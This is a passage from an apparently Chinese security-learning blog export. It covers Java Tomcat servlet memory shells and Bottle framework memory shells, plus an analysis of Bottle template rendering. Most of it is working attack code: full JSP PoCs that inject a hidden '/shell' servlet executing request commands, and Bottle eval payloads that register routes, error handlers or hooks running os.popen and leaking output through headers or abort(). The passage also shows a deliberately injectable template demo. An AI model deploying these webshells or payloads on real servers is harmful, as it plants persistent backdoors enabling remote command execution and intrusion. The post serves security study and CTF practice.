被卸载或服务器关闭前调用，用于释放资源，比如关闭数据库连接、清理缓存等。 |\n\n第三步就是要包装一下这个servlet，为了方便看，我把servlet初始化的流程搬过来\n\n- `Wrapper wrapper = context.createWrapper();` 创建 Wapper 对象\n- `wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());` 设置的LoadOnStartUp 的值\n- `wrapper.setName(servlet.getServletName());`设置 Servlet 的 Name\n- `wrapper.setServletClass(servlet.getServletClass());`设置 Servlet 对应的 Class全限定类名\n- `context.addChild(wrapper);`将 Servlet 添加到 context 的 children 中\n- `context.addServletMappingDecoded(entry.getKey(), entry.getValue());`将 url 路径和 servlet 类做映射\n\n```java\nS servlet = new S();\nString name = servlet.getClass().getSimpleName();\nWrapper newwrapper = standardContext.createWrapper();\nnewwrapper.setName(name);\nnewwrapper.setLoadOnStartup(1);\nnewwrapper.setServlet(servlet);\nnewwrapper.setServletClass(servlet.getClass().getName());\nstandardContext.addChild(newwrapper);\nstandardContext.addServletMappingDecoded(\"/shell\",name);\n```\n\n所以最后的完整poc就是\n\n## 03.3完整POC1\n\n```jsp\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%--<%@ page import=\"org.apache.catalina.connector.Request\" %>--%>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<%\n    class S implements Servlet{\n        @Override\n        public void init(ServletConfig config) throws ServletException {\n\n        }\n        @Override\n        public ServletConfig getServletConfig(){\n            return null;\n        }\n\n        @Override\n        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {\n            String cmd = req.getParameter(\"cmd\");\n            if(cmd != null){\n                try {\n                    Runtime.getRuntime().exec(cmd);\n                } catch (IOException e){\n                }\n            }\n        }\n\n        @Override\n        public void destroy(){\n\n        }\n        @Override\n        public String getServletInfo(){\n            return null;\n        }\n    }\n%>\n<%\n    //反射获取StandardContext\n    ServletContext servletContext = request.getServletContext();\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    // 更简单的方法 获取StandardContext\n//    Field reqF = request.getClass().getDeclaredField(\"request\");\n//    reqF.setAccessible(true);\n//    Request req = (Request) reqF.get(request);\n//    StandardContext standardContext = (StandardContext) req.getContext();\n\n    S servlet = new S();\n    String name = servlet.getClass().getSimpleName();\n    Wrapper newwrapper = standardContext.createWrapper();\n    newwrapper.setName(name);\n    newwrapper.setLoadOnStartup(1);\n    newwrapper.setServlet(servlet);\n    newwrapper.setServletClass(servlet.getClass().getName());\n    standardContext.addChild(newwrapper);\n    standardContext.addServletMappingDecoded(\"/shell\",name);\n\n    out.println(\"inject success\");\n%>\n```\n\n写完后启动服务器并访问这个jsp文件\n\n![image-20250821120123363](../image/achieve/202411/java学习/image-20250821120123363.png)\n\n然后访问我们刚刚的路由并RCE\n\n![image-20250821120426994](../image/achieve/202411/java学习/image-20250821120426994.png)\n\n成功弹出计算器，成功啦！\n\n但是这个poc其实还不够全面，一方面是runtime的exec函数只会返回一个proccess对象而不会返回命令执行回显内容，我们改进一下\n\n## 04好用的POC\n\n```java\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.util.Scanner\" %>\n<%@ page import=\"java.io.PrintWriter\" %>\n<%--<%@ page import=\"org.apache.catalina.connector.Request\" %>--%>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<%\n  Servlet servlet = new Servlet() {\n    @Override\n    public void init(ServletConfig servletConfig) throws ServletException {\n\n    }\n\n    @Override\n    public ServletConfig getServletConfig() {\n      return null;\n    }\n\n    @Override\n    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {\n      String cmd = servletRequest.getParameter(\"cmd\");\n      boolean isLinux = true;\n      String osTyp = System.getProperty(\"os.name\");\n      if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n        isLinux = false;\n      }\n      String[] cmdArray = isLinux ? new String[]{\"sh\",\"-c\",cmd} : new String[]{\"cmd.exe\",\"/c\",cmd}; //根据操作系统选择shell\n      //执行命令并获取命令输出\n      InputStream in = Runtime.getRuntime().exec(cmdArray).getInputStream();\n      Scanner s = new Scanner(in).useDelimiter(\"\\\\a\");  //使用 Scanner 读取 InputStream 的内容\n      String output = s.hasNext() ? s.next() : \"\";  //如果有内容就读取，否则为空字符串\n      PrintWriter out = servletResponse.getWriter();  //获取 Servlet 输出流，用于返回给客户端（浏览器）\n      out.println(output);  //打印输出\n      out.flush();\n      out.close();\n\n    }\n\n    @Override\n    public String getServletInfo() {\n      return \"\";\n    }\n\n    @Override\n    public void destroy() {\n\n    }\n  }\n%>\n<%\n  //反射获取StandardContext\n  ServletContext servletContext = request.getServletContext();\n  Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n  appctx.setAccessible(true);\n  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n  Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n  stdctx.setAccessible(true);\n  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n  // 更简单的方法 获取StandardContext\n//    Field reqF = request.getClass().getDeclaredField(\"request\");\n//    reqF.setAccessible(true);\n//    Request req = (Request) reqF.get(request);\n//    StandardContext standardContext = (StandardContext) req.getContext();\n  \n  String name = servlet.getClass().getSimpleName();\n  Wrapper newwrapper = standardContext.createWrapper();\n  newwrapper.setName(name);\n  newwrapper.setLoadOnStartup(1);\n  newwrapper.setServlet(servlet);\n  newwrapper.setServletClass(servlet.getClass().getName());\n  standardContext.addChild(newwrapper);\n  standardContext.addServletMappingDecoded(\"/shell\",name);\n\n  out.println(\"inject success\");\n%>\n```\n\n这里的话多了一个对操作系统的判断，根据Linux或者Windows操作系统去选择各自的shell，之后对命令的输出进行了一个获取和打印操作\n\n![image-20250821123359357](../image/achieve/202411/java学习/image-20250821123359357.png)\n\n## 完美撒花，小结一下\n\n第一个java的内存马就学完了，但其实后面会根据不同的waf去进行调整，例如无回显，打请求头注入，或者长度限制之类的，但其实收获还是很大的，因为自己遇到了一个做题的问题就是拿到源码后有点无从下手，我归结为是对这些源码的结构不够明确，对代码审计能力还需要提升，所以希望自己再继续努力吧\n\n关于servlet内存马，我觉得最重要的就是需要审计代码然后找到对应的context，也就是standardcontext，之后的话就是根据源码的实现去调用对应的函数去进行操作了\n","tags":["java内存马"],"categories":["javasec"]},{"title":"探究Bottle框架的一些好玩的","url":"/2025/08/15/探究Bottle框架的一些好玩的/","content":"\n## Bottle内存马\n\n### 0x01Bottle框架介绍\n\nBottle是一个快速，简单，轻量的 WSGI 微型Python web 框架。它只有一个文件模块，不依赖除了 Python标准库 之外的任何库。\n\n- **Routing:** 请求到函数调用的映射，支持整洁和动态的URL。\n- **Templates:** 快速且python风格的内置模板引擎，并支持 mako, jinja2 和cheetah。\n- **Utilities:** 便捷的获取表单数据，文件上传，cookies，headers和其他HTTP相关的元数据(metadata)。\n- **Server:** 内置HTTP开发服务器并支持paste, fapws3, bjoern, gae, cherrypy或其他任何的 WSGI HTTP 服务器。\n\n另外，Bottle框架自带模板渲染功能，而不依赖于Jinja2这种模板引擎\n\n```bash\npip3 install bottle\npip install bottle\n```\n\n直接下载最新版就行了\n\n然后我们试着写一下动态路由和静态路由\n\n- 静态路由\n\n```python\nfrom bottle import *\n\napp = Bottle()\n\n@app.route('/')\ndef index():\n  return 'Hello world'\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=8080, debug=True)\n```\n\n- 动态路由\n\n包含一个或多个通配符的路由被视为动态路由。所有其他路由都是静态路由。\n\n它可以匹配不止一个URL。一个简单的通配符(e.g. `<name>`)由包含在尖括号中直到下一个斜杠`/`前的一个或多个字符构成。例如，`/hello/<name>`既可以匹配请求`/hello/alice`，也可以匹配请求`/hello/bob`，但是不能匹配`/hello`,`/hello/`或`hello/mr/smith`\n\n另外介绍几个过滤器\n\n- **:int** 仅匹配数字(含符号)并将值转换为整型integer。\n- **:float** 与 :int 相似但匹配小数。\n- **:path** 非贪婪的方式匹配包含斜杠的所有字符，可以用来匹配不止一个路径的分割部分。\n- **:re** 允许你在config域中指定自定义的正则表达式。匹配到的值不会被修改。\n\n举个例子\n\n```python\nfrom bottle import *\n\napp = Bottle()\n\n@app.route('/object/<id:int>')\ndef callback(id):\n    return f\"ID = {id}\"\n\n@app.route('/')\ndef index():\n  return 'Hello world'\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=8080, debug=True)\n\n```\n\n我们跟进看一下route处理路由的逻辑\n\n```python\n    def route(self,\n              path=None,\n              method='GET',\n              callback=None,\n              name=None,\n              apply=None,\n              skip=None, **config):\n        \"\"\" A decorator to bind a function to a request URL. Example::\n\n                @app.route('/hello/<name>')\n                def hello(name):\n                    return 'Hello %s' % name\n\n            The ``<name>`` part is a wildcard. See :class:`Router` for syntax\n            details.\n\n            :param path: Request path or a list of paths to listen to. If no\n              path is specified, it is automatically generated from the\n              signature of the function.\n            :param method: HTTP method (`GET`, `POST`, `PUT`, ...) or a list of\n              methods to listen to. (default: `GET`)\n            :param callback: An optional shortcut to avoid the decorator\n              syntax. ``route(..., callback=func)`` equals ``route(...)(func)``\n            :param name: The name for this route. (default: None)\n            :param apply: A decorator or plugin or a list of plugins. These are\n              applied to the route callback in addition to installed plugins.\n            :param skip: A list of plugins, plugin classes or names. Matching\n              plugins are not installed to this route. ``True`` skips all.\n\n            Any additional keyword arguments are stored as route-specific\n            configuration and passed to plugins (see :meth:`Plugin.apply`).\n        \"\"\"\n        if callable(path): path, callback = None, path\n        plugins = makelist(apply)\n        skiplist = makelist(skip)\n\n        def decorator(callback):\n            if isinstance(callback, basestring): callback = load(callback)\n            for rule in makelist(path) or yieldroutes(callback):\n                for verb in makelist(method):\n                    verb = verb.upper()\n                    route = Route(self, rule, verb, callback,\n                                  name=name,\n                                  plugins=plugins,\n                                  skiplist=skiplist, **config)\n                    self.add_route(route)\n            return callback\n\n        return decorator(callback) if callback else decorator\n```\n\n先解释一下方法的参数\n\n- path：路由规则，可以是静态路由也可以是动态路由\n- method：HTTP请求方法，默认是GET，这里也可以是列表([\"POST\",\"GET])\n- callback：回调函数，可以直接传函数对象\n- name：给路由起一个名字\n- apply：额外要应用到这个路由的插件或装饰器。\n- skip：插件、插件类或名称的列表。匹配\n  此路由未安装插件。“True”跳过所有。\n\n然后我们看一下处理逻辑\n\n![image-20250815154233125](../image/achieve/202411/Bottle内存马/image-20250815154233125.png)\n\n先是检查传入的path是否是一个可调用的函数，如果是则交换path和callback的值，将原本的path值传给callback，并将path设置为None。\n\n在decorator内部函数中\n\n这里最后调用了一个add_route方法去添加路由，将这个Route对象注册倒app的路由列表中，最后返回我们路由中的函数\n\n走到add_route函数\n\n```python\n    def add_route(self, route):\n        \"\"\" Add a route object, but do not change the :data:`Route.app`\n            attribute.\"\"\"\n        self.routes.append(route)\n        self.router.add(route.rule, route.method, route, name=route.name)\n        if DEBUG: route.prepare()\n```\n\n在原先的路由列表上添加上新的路由信息，并将路由的规则，请求方法，路由名称都添加进去\n\n这里的话调试可以发现，真正执行decorator去注册路由其实是在def 函数定义的时候，这时候才会进入decorator函数去进行调用而不是在app.route的时候\n\n### 0x03如何调教callback\n\n先前了解到这里有一个callback是可以作为回调函数或者说处理请求的函数，但是在路由本身解析的过程中也可以看出，他是需要与用户自定义的一个函数去进行绑定，那我们需要思考一下如何在不写一个完整def的情况下定义一个函数\n\n第一个就是python自己默认的lambda表达式\n\n**lambda 表达式**是一种 **匿名函数**，也就是说不需要使用 `def` 关键字定义函数，可以在一行内快速创建小函数。\n\n语法\n\n```python\nlambda 参数1, 参数2, ...: 表达式\n```\n\n- `lambda` 表示创建匿名函数\n- 冒号 `:` 右边是函数返回的表达式\n- 这个表达式的结果就是函数的返回值\n\n例如我们正常的定义函数\n\n```python\ndef hello(x,y):\n    return x + y\nprint(hello(2,3))#输出5\n```\n\nlambda写法\n\n```python\nadd = lambda x,y: x+y\nprint(add(2,3))#输出5\n```\n\n那么这里我们写一个demo\n\n```python\nfrom bottle import *\n\napp = Bottle()\n\n@app.route('/shell')\ndef shell():\n  user_input = eval(request.query.get('poc'))\n  tpl = SimpleTemplate(\"Hello {{result}}\")\n  return tpl.render(result=user_input)\n\n@app.route(\"/\")\ndef index():\n    return \"Hello User!\"\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=8080, debug=True)\n\n```\n\n然后我们调用add_route去打一下\n\n```html\n/shell?poc=app.route(\"%2fb\"%2c\"GET\"%2clambda+%3aprint(1))\n```\n\n![image-20250815162247944](../image/achieve/202411/Bottle内存马/image-20250815162247944.png)\n\n然后我们访问/b路由，发现页面是空白的，但是在后台可以看到是输出1了\n\n![image-20250815162328316](../image/achieve/202411/Bottle内存马/image-20250815162328316.png)\n\n不过看到可以成功执行的命令的 所以我们注入路由是可行的,而且lambda表达式也是可以的\n\n### 手法一：app.route添加路由\n\n#### POC1\n\n```python\n/shell?poc=app.route(\"/b\",\"GET\",lambda :__import__('os').popen(request.params.get('cmd')).read())\n```\n\n然后传入/b?cmd=whoami 页面成功回显用户名\n\n这个很好理解 本身我们的路由就是和回调函数绑定的 所以执行的命令 也会直接回显在路由上 所以我们就不需要找其他回显之类的就可以进行命令执行\n\n### 手法二：app.error错误页面\n\n我们先看看error函数\n\n```python\n    def error(self, code=500, callback=None):\n        \"\"\" Register an output handler for a HTTP error code. Can\n            be used as a decorator or called directly ::\n\n                def error_handler_500(error):\n                    return 'error_handler_500'\n\n                app.error(code=500, callback=error_handler_500)\n\n                @app.error(404)\n                def error_handler_404(error):\n                    return 'error_handler_404'\n\n        \"\"\"\n\n        def decorator(callback):\n            if isinstance(callback, basestring): callback = load(callback)\n            self.error_handler[int(code)] = callback\n            return callback\n\n        return decorator(callback) if callback else decorator\n```\n\n`@error()` 装饰器实际上是注册一个错误处理函数，用于捕获特定的 HTTP 错误。错误处理函数会接受一个 `response` 对象和错误信息，并允许你自定义返回的错误页面或日志\n\n如果传了 `callback` 参数，直接注册并返回函数，不然的话就返回一个decorator，可以用作装饰器使用\n\n关注到一句\n\n```python\ncallback = load(callback)\n```\n\n这里的话会检查如果传入的是一个字符串模板名或模块路径，就加载它\n\n我们试一下\n\n```python\n/shell?poc=app.error(404)(lambda e: print(1))\n```\n\n然后随便访问一个不存在的路由，在后台就可以看到回显了\n\n![image-20250815163424496](../image/achieve/202411/Bottle内存马/image-20250815163424496.png)\n\npoc验证\n\n#### POC2\n\n```python\n/shell?poc=app.error(404)(lambda e: __import__('os').popen(request.params.get('cmd')).read())\n```\n\n然后访问/a?cmd=whoami成功执行命令\n\n### 手法三：hook钩子函数利用\n\n在编程里，**hook（钩子）\\**是一种机制，允许你在程序执行的某个特定点“插入”自定义代码。通俗来说，就是给程序预留的一个\\**插入点**，你可以在这里挂载自己的函数，以改变或扩展程序行为，而无需修改原来的核心代码。\n\n我们看看Bottle下有的hook函数\n\n![image-20250815163719836](../image/achieve/202411/Bottle内存马/image-20250815163719836.png)\n\n```python\n    __hook_names = 'before_request', 'after_request', 'app_reset', 'config'\n    __hook_reversed = {'after_request'}\n```\n\n这里的话定义了一个hook的名称，有每次请求前执行的hook、每次请求后执行的hook、应用重置时执行的hook、配置变更的时候执行的hook，并告诉我们如果存在多个after_request的时候会采取逆向反转的形式去调用，也就是后注册的先调用\n\n然后我们看一下关于hook的一些操作\n\n![image-20250815164013376](../image/achieve/202411/Bottle内存马/image-20250815164013376.png)\n\n看看add_hook方法，这里接收一个hook名称以及一个需要注册的回调函数\n\n处理逻辑：\n\n- 如果hook在`__hook_reversed`，也就是after_request，就使用insert在开头的位置插入该方法，意思就是后注册的先调用\n- 否则就直接添加在末尾，也就是后注册的后调用\n\n我们这里随便选一个hook试一下\n\n例如before_request\n\n```python\n/shell?poc=app.add_hook('before_request', lambda: print(1))\n```\n\n然后随便发送一个请求\n\n![image-20250815164526277](../image/achieve/202411/Bottle内存马/image-20250815164526277.png)\n\n再进行访问发现果然会触发函数，然后就需要思考如何将回显带到页面中呢\n\n尝试一下之前的方法\n\n```python\n/shell?poc=app.add_hook('before_request', lambda: __import__('os').popen('whoami').read())\n```\n\n好吧貌似没有回显，那么只能在响应头下手了\n\n如果想要控制响应头我们一定要关注一个操作对象 就是相应的reponse对象\n\n在Bottle中有一个封装的BaseResponse类\n\n![image-20250815165112355](../image/achieve/202411/Bottle内存马/image-20250815165112355.png)\n\n不难翻到一个可以操作的类\n\n![image-20250815165152818](../image/achieve/202411/Bottle内存马/image-20250815165152818.png)\n\n`set_header` 方法用来设置一个 HTTP 响应头。`name` 是头的名字，例如 `\"Content-Type\"`。`value` 是头的值，例如 `\"text/html\"`。\n\n所以调用 `set_header(\"Content-Type\", \"text/html\")` 就会把响应的 `\"Content-Type\"` 设置为 `\"text/html\"`，如果之前有这个头，会直接替换掉。\n\n那现在问题又来了，我们该如何调用到response对象 或者说操纵response对象\n\n因为这个是在bottle中内置的，所以可以直接import去调用\n\n```python\n__import__('bottle'.response)\n```\n\n所以我们写一下poc\n\n```python\n/shell?poc=app.add_hook('before_request', lambda: __import__('bottle').response.set_header('X-flag',__import__('os').popen('whoami').read()))\n```\n\n但是报500了，后面发现是whoami这个命令输出结果会有一个`\\n`，而响应头中不允许有换行符，所以编码一下吧\n\n```python\n/shell?poc=app.add_hook('before_request', lambda: __import__('bottle').response.set_header('X-flag',__import__('base64').b64encode(__import__('os').popen('whoami').read().encode('utf-8')).decode('utf-8')))\n```\n\n![image-20250815170836274](../image/achieve/202411/Bottle内存马/image-20250815170836274.png)\n\n解码出来就是用户名\n\n这里的话给一个好点的poc，可控的命令参数\n\n#### POC3\n\n```python\n/shell?poc=app.add_hook('before_request', lambda: __import__('bottle').response.set_header('X-flag',__import__('base64').b64encode(__import__('os').popen(request.query.get('a')).read().encode('utf-8')).decode('utf-8')))\n```\n\n![image-20250815171115915](../image/achieve/202411/Bottle内存马/image-20250815171115915.png)\n\n继续翻看bottle中的内置函数，注意到一个内置函数abort\n\n![image-20250815171353089](../image/achieve/202411/Bottle内存马/image-20250815171353089.png)\n\n这里的话会触发一个500的异常，但是这里的text是我们可控回显在页面上的，所以可以尝试写poc\n\n```python\n/shell?poc=app.add_hook('before_request', lambda: __import__('bottle').abort(500,__import__('os').popen('whoami').read()))\n```\n\n传入后发送请求\n\n![image-20250815171643265](../image/achieve/202411/Bottle内存马/image-20250815171643265.png)\n\n可以打，那就直接写poc\n\n#### POC4\n\n```python\n/shell?poc=app.add_hook('before_request', lambda: __import__('bottle').abort(500,__import__('os').popen(request.query.get('a')).read()))\n```\n\n![image-20250815171807564](../image/achieve/202411/Bottle内存马/image-20250815171807564.png)\n\n参考文章：https://forum.butian.net/share/4048\n\n## Bottle中处理模板渲染\n\n我发现Bottle中有一个很好玩的事情，就是关于他templates函数渲染模板的一个处理逻辑\n\n### template函数处理\n\n我们先来看一下templates函数的定义\n\n```python\ndef template(*args, **kwargs):\n    \"\"\"\n    Get a rendered template as a string iterator.\n    You can use a name, a filename or a template string as first parameter.\n    Template rendering arguments can be passed as dictionaries\n    or directly (as keyword arguments).\n    \"\"\"\n    tpl = args[0] if args else None\n    for dictarg in args[1:]:\n        kwargs.update(dictarg)\n    adapter = kwargs.pop('template_adapter', SimpleTemplate)\n    lookup = kwargs.pop('template_lookup', TEMPLATE_PATH)\n    tplid = (id(lookup), tpl)\n    if tplid not in TEMPLATES or DEBUG:\n        settings = kwargs.pop('template_settings', {})\n        if isinstance(tpl, adapter):\n            TEMPLATES[tplid] = tpl\n            if settings: TEMPLATES[tplid].prepare(**settings)\n        elif \"\\n\" in tpl or \"{\" in tpl or \"%\" in tpl or '$' in tpl:\n            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)\n        else:\n            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)\n    if not TEMPLATES[tplid]:\n        abort(500, 'Template (%s) not found' % tpl)\n    return TEMPLATES[tplid].render(kwargs)\n\n\nmako_template = functools.partial(template, template_adapter=MakoTemplate)\ncheetah_template = functools.partial(template,\n                                     template_adapter=CheetahTemplate)\njinja2_template = functools.partial(template, template_adapter=Jinja2Template)\n```\n\n先看看形式参数：\n\n- `*args`：可传模板内容、模板名或文件名。\n\n- `**kwargs`：可传渲染模板需要的变量，或者模板引擎适配器等特殊参数。\n\n```python\ntpl = args[0] if args else None\nfor dictarg in args[1:]:\n    kwargs.update(dictarg)\nadapter = kwargs.pop('template_adapter', SimpleTemplate)\nlookup = kwargs.pop('template_lookup', TEMPLATE_PATH)\n```\n\n这里的话会将第一个位置参数arg[0]作为模板源，如果没有就是None，后面会遍历剩余的位置参数并合并到kwargs中\n\n从kwargs中提取模板引擎参数template_adapter和模板搜索路径template_lookup，模板引擎的话默认使用 Bottle 自带的 `SimpleTemplate`，模板搜索路径默认是TEMPLATE_PATH\n\n```python\ntplid = (id(lookup), tpl)\n```\n\n构建模板缓存的唯一 ID，用于缓存编译后的模板。\n\n```python\nif tplid not in TEMPLATES or DEBUG:\n    settings = kwargs.pop('template_settings', {})\n    if isinstance(tpl, adapter):\n        TEMPLATES[tplid] = tpl\n        if settings: TEMPLATES[tplid].prepare(**settings)\n    elif \"\\n\" in tpl or \"{\" in tpl or \"%\" in tpl or '$' in tpl:\n        TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)\n    else:\n        TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)\nif not TEMPLATES[tplid]:\n    abort(500, 'Template (%s) not found' % tpl)\nreturn TEMPLATES[tplid].render(kwargs)\n```\n\n如果模板缓存里没有这个模板，或者开启 DEBUG 模式，则重新构建模板对象，settings会获取模板设置，默认是空字典，这些设置会传入给模板引擎\n\n如果传入的模板已经是模板对象（而不是字符串或文件名），直接缓存它。\n\n重点关注这里\n\n```python\nelif \"\\n\" in tpl or \"{\" in tpl or \"%\" in tpl or '$' in tpl:\n    TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)\n```\n\n判断模板是否是模板字符串（含有换行、`{}`、`%` 或 `$`）。如果是就直接用adapter模板引擎创建模板对象并缓存\n\n后面的话就是常规的渲染模板操作并返回渲染字符串\n\n```python\nmako_template = functools.partial(template, template_adapter=MakoTemplate)\ncheetah_template = functools.partial(template,\n                                     template_adapter=CheetahTemplate)\njinja2_template = functools.partial(template, template_adapter=Jinja2Template)\n```\n\n这里创建了三个预设模板函数，每个函数固定使用特定的模板引擎，那怎么去用他们呢？\n\n```python\n# 用 Mako 引擎渲染模板源码\ntpl = \"Hello ${name}!\"\nprint(mako_template(tpl, name=\"Tom\"))\n\n# 用 Jinja2 引擎渲染\ntpl2 = \"Hello {{ name }}!\"\nprint(jinja2_template(tpl2, name=\"Jerry\"))\n```\n\n没错，就是这么简单快捷，然后我们来看一下\n\n### bottle自带模板引擎\n\n上面就是简单的代码分析，我们先来看看最重要的一个东西\n\n```python\nadapter = kwargs.pop('template_adapter', SimpleTemplate)\n```\n\n这里会根据参数中的template_adapter去选择模板引擎，默认是SimpleTemplate，不过翻了一下bottle模块，发现里面有三种模板引擎可以使用\n\n![image-20250818104542876](../image/achieve/202411/Bottle内存马/image-20250818104542876.png)\n\n但这些都是需要指定参数的，然后我们跟进SimpleTemplate看看\n\n### SimpleTemplate模板引擎\n\n官方文档：https://bottlepy.org/docs/dev/stpl.html\n\nBottle自带了一个快速，强大，易用的模板引擎，名为 *SimpleTemplate* 或简称为 *stpl* 。它是 `view()` 和 `template()` 两个函数默认调用的模板引擎。\n\n`SimpleTemplate` 类实现了 `BaseTemplate` 接口\n\n```python\nclass SimpleTemplate(BaseTemplate):\n    def prepare(self,\n                escape_func=html_escape,\n                noescape=False,\n                syntax=None, **ka):\n        self.cache = {}\n        enc = self.encoding\n        self._str = lambda x: touni(x, enc)\n        self._escape = lambda x: escape_func(touni(x, enc))\n        self.syntax = syntax\n        if noescape:\n            self._str, self._escape = self._escape, self._str\n\n    @cached_property\n    def co(self):\n        return compile(self.code, self.filename or '<string>', 'exec')\n\n    @cached_property\n    def code(self):\n        source = self.source\n        if not source:\n            with open(self.filename, 'rb') as f:\n                source = f.read()\n        try:\n            source, encoding = touni(source), 'utf8'\n        except UnicodeError:\n            raise depr(0, 11, 'Unsupported template encodings.', 'Use utf-8 for templates.')\n        parser = StplParser(source, encoding=encoding, syntax=self.syntax)\n        code = parser.translate()\n        self.encoding = parser.encoding\n        return code\n\n    def _rebase(self, _env, _name=None, **kwargs):\n        _env['_rebase'] = (_name, kwargs)\n\n    def _include(self, _env, _name=None, **kwargs):\n        env = _env.copy()\n        env.update(kwargs)\n        if _name not in self.cache:\n            self.cache[_name] = self.__class__(name=_name, lookup=self.lookup, syntax=self.syntax)\n        return self.cache[_name].execute(env['_stdout'], env)\n\n    def execute(self, _stdout, kwargs):\n        env = self.defaults.copy()\n        env.update(kwargs)\n        env.update({\n            '_stdout': _stdout,\n            '_printlist': _stdout.extend,\n            'include': functools.partial(self._include, env),\n            'rebase': functools.partial(self._rebase, env),\n            '_rebase': None,\n            '_str': self._str,\n            '_escape': self._escape,\n            'get': env.get,\n            'setdefault': env.setdefault,\n            'defined': env.__contains__\n        })\n        exec(self.co, env)\n        if env.get('_rebase'):\n            subtpl, rargs = env.pop('_rebase')\n            rargs['base'] = ''.join(_stdout)  #copy stdout\n            del _stdout[:]  # clear stdout\n            return self._include(env, subtpl, **rargs)\n        return env\n\n    def render(self, *args, **kwargs):\n        \"\"\" Render the template using keyword arguments as local variables. \"\"\"\n        env = {}\n        stdout = []\n        for dictarg in args:\n            env.update(dictarg)\n        env.update(kwargs)\n        self.execute(stdout, env)\n        return ''.join(stdout)\n```\n\n根据最后的`return TEMPLATES[tplid].render(kwargs)`可以知道最终会调用到render函数，分析一下\n\n```python\n    def render(self, *args, **kwargs):\n        \"\"\" Render the template using keyword arguments as local variables. \"\"\"\n        env = {}\n        stdout = []\n        for dictarg in args:\n            env.update(dictarg)\n        env.update(kwargs)\n        self.execute(stdout, env)\n        return ''.join(stdout)\n```\n\n先是创建了一个env字典用来存放所有模板变量和一个列表stdout用来收集模板渲染的输出，而后遍历所有的位置参数并将变量加入env中，最终 `env` 包含模板渲染所需的所有变量。\n\n后面会调用execute函数，我们跟进看一下\n\n```python\n    def execute(self, _stdout, kwargs):\n        env = self.defaults.copy()\n        env.update(kwargs)\n        env.update({\n            '_stdout': _stdout,\n            '_printlist': _stdout.extend,\n            'include': functools.partial(self._include, env),\n            'rebase': functools.partial(self._rebase, env),\n            '_rebase': None,\n            '_str': self._str,\n            '_escape': self._escape,\n            'get': env.get,\n            'setdefault': env.setdefault,\n            'defined': env.__contains__\n        })\n        exec(self.co, env)\n        if env.get('_rebase'):\n            subtpl, rargs = env.pop('_rebase')\n            rargs['base'] = ''.join(_stdout)  #copy stdout\n            del _stdout[:]  # clear stdout\n            return self._include(env, subtpl, **rargs)\n        return env\n```\n\n这里的可以看到两个预设函数include和rebase，include是用于在模板内部 **嵌入子模板**的，而rebase是用于实现模板继承的。\n\n```python\n   def _rebase(self, _env, _name=None, **kwargs):\n        _env['_rebase'] = (_name, kwargs)\n\n    def _include(self, _env, _name=None, **kwargs):\n        env = _env.copy()\n        env.update(kwargs)\n        if _name not in self.cache:\n            self.cache[_name] = self.__class__(name=_name, lookup=self.lookup, syntax=self.syntax)\n        return self.cache[_name].execute(env['_stdout'], env)\n```\n\n*在 0.12 版中更改：*在此版本之前，`include()`和[`rebase()`](https://bottlepy.org/docs/dev/stpl.html#stpl.rebase)是语法关键字，而不是函数。接下来我们看看bottle模板引擎渲染中比较重要的几个语法\n\n### Bottle模板引擎渲染语法\n\n常规的我们还是先写个例子吧\n\n```python\nfrom bottle import Bottle, template, run, request\n\napp = Bottle()\n\n@app.route('/')\ndef index():\n    return \"Hello World!\"\n\n\n@app.route('/test')\ndef greet():\n\n    user_name = request.query.name or \"Hello Guest\"\n\n    return template(user_name)\n\n\nif __name__ == \"__main__\":\n    run(app, host=\"localhost\", port=8080, debug=True)\n```\n\n这里的话会直接将用户的输入当成是模板去渲染\n\n#### 内联表达式1\n\n任何python表达式都允许在大括号内，只要它计算为字符串或具有字符串表示的东西，也就是我们常规的表达式语句\n\n例如我们传入\n\n```python\n?name={{8*8}}\n```\n\n就会返回`8*8`的执行结果64\n\n#### 内联表达式2\n\n```\n在 Bottle 的 SimpleTemplate 模板引擎中，{{!...}} 是一种 原样输出（raw output） 的语法，用于 不经过转义地输出内容\n```\n\n#### 嵌入python代码\n\n我们举个例子\n\n```python\n%if name == 'World':\n\t<h1> Hello {{name}} </h1>\n\t<p> This is a test.</p>\n%else:\n\t<h1>Hello {{name.title()}}！</h1>\n\t<p>How are you?</p>\n%end\n```\n\n一行以%开头，表明这一行是python代码。它和真正的python代码唯一的区别，在于你需要显式地在末尾添加`%end`语句，表明一个代码块结束。\n\n当然这里也可以直接导入模块\n\n```python\n%import 